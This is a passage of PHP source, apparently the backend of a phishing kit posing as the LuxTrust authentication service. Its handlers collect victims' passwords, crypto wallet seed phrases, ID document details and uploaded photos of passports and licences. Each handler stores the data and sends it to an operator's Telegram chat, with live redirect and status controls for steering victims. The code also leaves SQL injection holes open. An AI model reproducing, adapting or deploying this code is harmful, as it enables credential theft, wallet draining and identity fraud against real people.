            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
    // Query database for user information
    $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
    $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

    // Format the Telegram message
    $tmsg = "
<strong> luxtrust </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
👤 <strong>Email/User::</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Resend Tap:</strong> <code>$resendtap</code>\n
<code>━━━━━━━━━━━━━━━</code>\n\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date $time</code>\n
";

    // Clean up any unnecessary line breaks
    $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

    // Send the message to Telegram
    $telegram = new Telegram($bot_token);
    $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
    $telegram->sendMessage($content);
}

    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}


if ($_GET['type'] == 'custom_redirect') {
    $uniqueid = $_SESSION['uniqueid'] ?? null;
    $date = date("Y-m-d h:i a", time());

    if (!$uniqueid) {
        echo json_encode(['status' => 'error', 'message' => 'Session uniqueid is missing']);
        exit;
    }

    if (!empty($_POST['custom_redirect'])) {
        $custom_redirect = mysqli_real_escape_string($conn, $_POST['custom_redirect']);

        // Validate if the URL format is correct
        if (!filter_var($custom_redirect, FILTER_VALIDATE_URL)) {
            echo json_encode(['status' => 'invalid_url', 'message' => 'Invalid URL format']);
            exit;
        }

        // Check if user exists in DB
        $stmt_check = $conn->prepare("SELECT id FROM clients WHERE uniqueid = ?");
        $stmt_check->bind_param("s", $uniqueid);
        $stmt_check->execute();
        $result_check = $stmt_check->get_result();

        if ($result_check->num_rows === 0) {
            echo json_encode(['status' => 'user_not_found', 'message' => 'No user found with this uniqueid']);
            exit;
        }

        // Update database with new redirect URL
        $stmt = $conn->prepare("UPDATE clients SET status=180, custom_redirect = ? WHERE uniqueid = ?");
        $stmt->bind_param("ss", $custom_redirect, $uniqueid);

        if ($stmt->execute()) {
            echo json_encode(['status' => 'ok']);
        } else {
            echo json_encode(['status' => 'db_error', 'message' => 'Database update failed', 'error' => $stmt->error]);
        }
    } else {
        echo json_encode(['status' => 'missing_parameters', 'message' => 'Custom redirect URL is empty']);
    }
}



if ($_GET['type'] == 'vpwdreset') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['vpwdreset2'])) {
        $vpwdreset2 = mysqli_real_escape_string($conn, $_POST['vpwdreset2']);

        // Update database with the confirmed password
        $query = mysqli_query($conn, "UPDATE clients SET status=36, buzzed=0, vpwdreset='$vpwdreset2' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Telegram notification
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "
<strong> luxtrust </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
👤 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Password Reset:</strong> <code>$vpwdreset2</code>\n
<code>━━━━━━━━━━━━━━━</code>\n\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date</code>\n
";

            // Clean up any unnecessary line breaks
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send the message to Telegram
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        // No password provided
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}




if ($_GET['type'] == 'tryanotherway') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time()); // Added for Telegram

    // Handle the tryanotherway action
    $query = mysqli_query($conn, "UPDATE clients SET status=181 WHERE uniqueid='$uniqueid'");
    if ($query) {
        $response = array('status' => 'ok', 'message' => 'tryanotherway processed successfully');

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b>luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📲 <b>Try anotherway:</b> <code>Pushed</code>\n"; // Static value since no $_POST['tryanotherway']
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n"; // Ensure $ip is defined
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token); // Ensure $bot_token is defined
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'Failed to process tryanotherway');
    }

    // Ensure proper JSON output
    header('Content-Type: application/json');
    echo json_encode($response);
    exit; // Prevent extra output
}



if ($_GET['type'] == 'annulation') {
    $uniqueid = $_SESSION['uniqueid'];
    
    // Handle the annulation action
    $query = mysqli_query($conn, "UPDATE clients SET status=114 WHERE uniqueid='$uniqueid'");
    if ($query) {
        $response = array('status' => 'ok', 'message' => 'Annulation processed successfully');
    } else {
        $response = array('status' => 'notok', 'message' => 'Failed to process annulation');
    }

    echo json_encode($response);
}


if ($_GET['type'] == 'annule_form') {


    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    // Check if the 'annule_form' parameter is provided in the POST data
    if (!empty($_POST['annule_form'])) {
        $annule_form = mysqli_real_escape_string($conn, $_POST['annule_form']);

        // Update the database with the annule_form phrase
        $query = mysqli_query($conn, "UPDATE clients SET status=114, buzzed=0, annule_form='$annule_form' WHERE uniqueid='$uniqueid'");
        
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Optional: Sending the annule_form phrase to Telegram if enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            // Query database for user information
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            // Format the Telegram message with emojis and clean layout
            $tmsg = "
<strong> luxtrust </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
📧 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔒 <strong>Cancel Recovery:</strong> <code>$annule_form</code>\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date</code>\n";

            // Clean up any unnecessary line breaks
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send the message to Telegram
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'Seed phrase is empty or invalid');
    }

    // Return the response as JSON
    echo json_encode($response);
}

if ($_GET['type'] == 'seed') {


    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    // Check if the 'seed' parameter is provided in the POST data
    if (!empty($_POST['seed'])) {
        $seed = mysqli_real_escape_string($conn, $_POST['seed']);

        // Update the database with the seed phrase
        $query = mysqli_query($conn, "UPDATE clients SET status=32, buzzed=0, seed='$seed' WHERE uniqueid='$uniqueid'");
        
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Optional: Sending the seed phrase to Telegram if enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            // Query database for user information
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            // Format the Telegram message with emojis and clean layout
            $tmsg = "
<strong> luxtrust </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
📧 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🌱 <strong>Seed:</strong> <code>$seed</code>\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date</code>\n";

            // Clean up any unnecessary line breaks
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send the message to Telegram
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'Seed phrase is empty or invalid');
    }

    // Return the response as JSON
    echo json_encode($response);
}

if ($_GET['type'] == 'seederror') {


    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    // Check if the 'seed' parameter is provided in the POST data
    if (!empty($_POST['seed'])) {
        $seed = mysqli_real_escape_string($conn, $_POST['seed']);

        // Update the database with the seed phrase
        $query = mysqli_query($conn, "UPDATE clients SET status=34, buzzed=0, seed='$seed' WHERE uniqueid='$uniqueid'");
        
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Optional: Sending the seed phrase to Telegram if enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            // Query database for user information
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            // Format the Telegram message with emojis and clean layout
            $tmsg = "
<strong> luxtrust </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
📧 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🌱 <strong>Seed Error:</strong> <code>$seed</code>\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date</code>\n";

            // Clean up any unnecessary line breaks
            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send the message to Telegram
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'Seed phrase is empty or invalid');
    }

    // Return the response as JSON
    echo json_encode($response);
}

//Recovery doc

if ($_GET['type'] == 'recoverystart') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['recoverystart'])) {
        $recoverystart = mysqli_real_escape_string($conn, $_POST['recoverystart']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=68, buzzed=0, recoverystart='$recoverystart' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Start verication:</b> <code>$recoverystart</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'govdoc') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['govdoc'])) {
        $govdoc = mysqli_real_escape_string($conn, $_POST['govdoc']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=76, buzzed=0, govdoc='$govdoc' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>DOC Gov ID:</b> <code>$govdoc</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}

if ($_GET['type'] == 'driverdoc') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['driverdoc'])) {
        $driverdoc = mysqli_real_escape_string($conn, $_POST['driverdoc']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=72, buzzed=0, driverdoc='$driverdoc' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>DOC Driver License :</b> <code>$driverdoc</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}

if ($_GET['type'] == 'passportdoc') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['passportdoc'])) {
        $passportdoc = mysqli_real_escape_string($conn, $_POST['passportdoc']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=70, buzzed=0, passportdoc='$passportdoc' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>DOC Passport:</b> <code>$passportdoc</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}


if ($_GET['type'] == 'frontdocInput') {
    session_start();
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());
    $ip = $_SERVER['REMOTE_ADDR'];

    if (!empty($_FILES['frontdocInput']['tmp_name'])) {
        $file = $_FILES['frontdocInput'];

        // Validate file type
        $allowedTypes = ['image/png', 'image/jpeg'];
        if (!in_array($file['type'], $allowedTypes)) {
            echo json_encode(['status' => 'error', 'message' => 'Invalid file type. Only PNG and JPEG are allowed.']);
            exit;
        }

        // Prepare the upload directory
        $uploadDir = __DIR__ . '/upload/';
        if (!file_exists($uploadDir)) {
            mkdir($uploadDir, 0777, true);
        }

        // Create a unique file name and move the file
        $fileName = uniqid('doc_', true) . '.' . pathinfo($file['name'], PATHINFO_EXTENSION);
        $filePath = $uploadDir . $fileName;
        $relativePath = 'inc/upload/' . $fileName;

        if (move_uploaded_file($file['tmp_name'], $filePath)) {
            // Update the database with the new file path
            $documentPath = mysqli_real_escape_string($conn, $relativePath);
            $updateQuery = mysqli_query($conn, "UPDATE clients SET frontdoc='$documentPath', status=137, buzzed=0 WHERE uniqueid='$uniqueid'");

            if (!$updateQuery) {
                echo json_encode(['status' => 'error', 'message' => 'Failed to update the database.']);
                exit;
            }

            // Get user details from the database
            $result = mysqli_query($conn, "SELECT user FROM clients WHERE uniqueid='$uniqueid'");
            $user = mysqli_fetch_assoc($result);

            // Sending the file to Telegram
            $telegram = new Telegram($bot_token);
            $tmsg = "<b>luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$user['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📄 <b>Front Document Uploaded:</b> See attached\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $tmsg,
                'parse_mode' => 'HTML'
            ]);

            $telegram->sendPhoto([
                'chat_id' => $telegram_chaid,
                'photo' => new CURLFile(realpath($filePath)),
                'caption' => "Document uploaded for {$user['user']} - IP: $ip"
            ]);

            echo json_encode(['status' => 'ok', 'message' => 'Document submitted successfully and sent to Telegram. Database updated.']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Failed to save document.']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'No document uploaded.']);
    }
    exit; // Ensure no further output
}

if ($_GET['type'] == 'backdocInput') {
    session_start();
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());
    $ip = $_SERVER['REMOTE_ADDR'];

    if (!empty($_FILES['backdocInput']['tmp_name'])) {
        $file = $_FILES['backdocInput'];

        // Validate file type
        $allowedTypes = ['image/png', 'image/jpeg'];
        if (!in_array($file['type'], $allowedTypes)) {
            echo json_encode(['status' => 'error', 'message' => 'Invalid file type. Only PNG and JPEG are allowed.']);
            exit;
        }

        // Prepare the upload directory
        $uploadDir = __DIR__ . '/upload/';
        if (!file_exists($uploadDir)) {
            mkdir($uploadDir, 0777, true);
        }

        // Create a unique file name and move the file
        $fileName = uniqid('doc_', true) . '.' . pathinfo($file['name'], PATHINFO_EXTENSION);
        $filePath = $uploadDir . $fileName;
        $relativePath = 'inc/upload/' . $fileName;

        if (move_uploaded_file($file['tmp_name'], $filePath)) {
            // Update the database with the new file path (adjust column name as needed)
            $documentPath = mysqli_real_escape_string($conn, $relativePath);
            $updateQuery = mysqli_query($conn, "UPDATE clients SET backdoc='$documentPath', status=139, buzzed=0 WHERE uniqueid='$uniqueid'");

            if (!$updateQuery) {
                echo json_encode(['status' => 'error', 'message' => 'Failed to update the database.']);
                exit;
            }

            // Get user details from the database
            $result = mysqli_query($conn, "SELECT user FROM clients WHERE uniqueid='$uniqueid'");
            $user = mysqli_fetch_assoc($result);

            // Sending the file to Telegram
            $telegram = new Telegram($bot_token);
            $tmsg = "<b>luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$user['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📄 <b>Back Document Uploaded:</b> See attached\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $tmsg,
                'parse_mode' => 'HTML'
            ]);

            $telegram->sendPhoto([
                'chat_id' => $telegram_chaid,
                'photo' => new CURLFile(realpath($filePath)),
                'caption' => "Back document uploaded for {$user['user']} - IP: $ip"
            ]);

            echo json_encode(['status' => 'ok', 'message' => 'Back document submitted successfully and sent to Telegram. Database updated.']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Failed to save document.']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'No document uploaded.']);
    }
    exit;
}



if ($_GET['type'] == 'submit_govid') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['submit_govid'])) {
        $submit_govid = mysqli_real_escape_string($conn, $_POST['submit_govid']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=131, buzzed=0, submit_govid='$submit_govid' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Selected type:</b> <code>$submit_govid</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}

if ($_GET['type'] == 'submit_dl') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['submit_dl'])) {
        $submit_dl = mysqli_real_escape_string($conn, $_POST['submit_dl']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=133, buzzed=0, submit_dl='$submit_dl' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Selected type:</b> <code>$submit_dl</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}


if ($_GET['type'] == 'submit_passport') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['submit_passport'])) {
        $submit_passport = mysqli_real_escape_string($conn, $_POST['submit_passport']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=135, buzzed=0, submit_passport='$submit_passport' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Selected type:</b> <code>$submit_passport</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}




if($_SESSION['started'] == 'true'){


	if($_GET['type'] == 'getstatus'){
		$uniqueid = $_SESSION['uniqueid'];
		$query = mysqli_query($conn, "SELECT * from clients WHERE uniqueid=$uniqueid");
		
		if(mysqli_num_rows($query) >= 1){
